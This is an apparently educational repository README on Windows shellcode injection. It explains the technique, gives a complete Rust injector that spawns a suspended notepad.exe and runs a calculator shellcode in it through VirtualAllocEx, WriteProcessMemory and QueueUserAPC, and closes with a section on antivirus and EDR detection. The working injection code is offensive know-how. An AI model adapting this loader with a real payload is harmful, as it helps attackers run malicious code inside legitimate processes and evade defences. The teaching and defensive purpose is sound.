# Shellcode-Injection
A collection of information regarding shellcode injection.

## Introduction
In this repository I will explain what shellcode injection is, how it works and how we can prevent attackers from doing it.

### What is shellcode?
Shellcode is PIC (Position independent code), meaning that it can execute regardless of its memory address or file location. This is useful for attackers as they are able to inject it into a process without needing to modify the target program at all. Shellcode is written in assembly which is difficult to understand so usually automated tools are used to create shellcode from already written programs. Tools such as [Donut] are used to do this.(https://github.com/TheWover/donut)
### How does it work?
Now that we have established what shellcode is I can now explain how it is injected and later I will provide a code example.

Shellcode can be injected in lots of different ways some include remote process injection, local thread injection and remote thread injection but there are many more.

It usually works by starting a remote process in a suspended state, allocating a memory region, changing the permissions to allow for execution, then writing the shellcode to the memory then finally resuming the thread. After this the shellcode will be executed and running in that remote process.
#### Code example:
I have used the windows-sys crate to interact with the windows API.
```
[dependencies]  
windows-sys = { version = "0.52.0", features = ["Win32_System_Memory", "Win32_Foundation", "Win32_System_Threading", "Win32_System_Diagnostics_Debug", "Win32_Security", "Win32_System_SystemServices", "Win32_System_SystemInformation", "Win32_System_Kernel"] }
```
```
use {  
    std::{  
        ptr::{null_mut, null},  
        mem::{zeroed},  
        intrinsics::transmute,  
    },  
    windows_sys::Win32::{  
        Foundation::{FALSE, TRUE},  
        System::{  
            Memory::{VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE},  
            Diagnostics::Debug::{WriteProcessMemory},  
            Threading::{CreateProcessA, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA, CREATE_NO_WINDOW, QueueUserAPC},  
        },  
    },  
};  
  
fn main() {  
    let calc_shellcode = include_bytes!(r#"C:\Users\user\Desktop\calc.bin"#); // Shellcode to spawn calculator  
  let notepad_location = b"C:\\Windows\\System32\\notepad.exe\0";  
  
    unsafe { // unsafe as the compiler cannot guarantee the memory safety.  
  let mut pi: PROCESS_INFORMATION = zeroed();  
        let mut si: STARTUPINFOA = zeroed();  
        si.dwFlags = STARTF_USESTDHANDLES | CREATE_SUSPENDED;  
        si.wShowWindow = 0;  
  
        let create_proc = CreateProcessA( // creates the process  
  notepad_location.as_ptr(),  
            null_mut(),  
            null(),  
            null(),  
            TRUE,  
            CREATE_NO_WINDOW,  
            null(),  
            null(),  
            &si,  
            &mut pi,  
        );  
        if create_proc == FALSE {  
            println!("failed to create process");  
            return;  
        }  
  
        let allocate_mem = VirtualAllocEx( // allocates the memory that we will later write the shellcode to.  
  pi.hProcess,  
            null(),  
            calc_shellcode.len(),  
            MEM_COMMIT | MEM_RESERVE,  
            PAGE_READWRITE,  
        );  
        if allocate_mem.is_null() {  
            println!("failed to allocate memory");  
            return;  
        }  
  
        let write_shell = WriteProcessMemory( // write the shellcode to the allocated memory  
  pi.hProcess,  
            allocate_mem,  
            calc_shellcode.as_ptr().cast(),  
            calc_shellcode.len(),  
            null_mut(),  
        );  
        if write_shell == FALSE {  
            println!("failed to write shellcode");  
            return;  
        }  
  
        let mut old = PAGE_READWRITE;  
        let res = VirtualProtectEx(pi.hProcess, allocate_mem, calc_shellcode.len(), PAGE_EXECUTE, &mut old); // makes the shellcode executable  
  if res == FALSE {  
            println!("failed to make shellcode executable");  
            return;  
        }  
  
        let func = transmute(allocate_mem); // transmutes the shellcode to a function pointer  
  let res = QueueUserAPC(Some(func), pi.hThread, 0); // queues the user APC  
  if res == 0 {  
            println!("failed to queue user APC");  
            return;  
        }  
    }  
}
```
So this code here will inject caluclator.exe shellcode into notepad, obviously in a real world scenario an attacker would inject a malicious payload.
##  Prevention
Antiviruses and EDR's employ a range of tactics when it comes to preventing shellcode injection and similar attacks. The big prevention method that most services implement is monitoring API calls, as you will be able to see in my code I use API calls such as CreateProcessA, VirtualAllocEx, WriteProcessMemory and VirtualProtectEx these calls are invoked from KERNEL32.DLL which is loaded into the running application. These calls have corresponding functions in the windows native API which is exposed by NTDLL.DLL. So AV's and EDR's hook into NTDLL and analyze any calls which a program makes which allows them to determine if a program is malicious or not.

Now for most people the best way to prevent an attack like this is common sense do not download things from untrusted sources however sometimes it is unavoidably so after testing these types of attacks on a range of antiviruses I have seen two stand out AV's:

The first being [ESET/NOD32](https://www.eset.com/)
- Its host intrusion protection system is brilliant at detecting unwanted behavior in host processes and normal programs. Especially its memory scanning, which checks the heuristic behavior of all program including host ones like "svchost", "regasm" which are common attack vectors. 

The second is [SOPHOS](https://www.sophos.com/)
- Sophos recently introduced "Intercept X" which blocks common shellcode injection techniques like allocating memory in a remote process.

Overall shellcode injection is very dangerous and better prevention techniques should be implemented into more AV's to stop these types of attack, however malware is a cat and mouse game when one technique is flagged/signature another one pops up so its important to stay up to date with attacks to stop yourself being the victim.
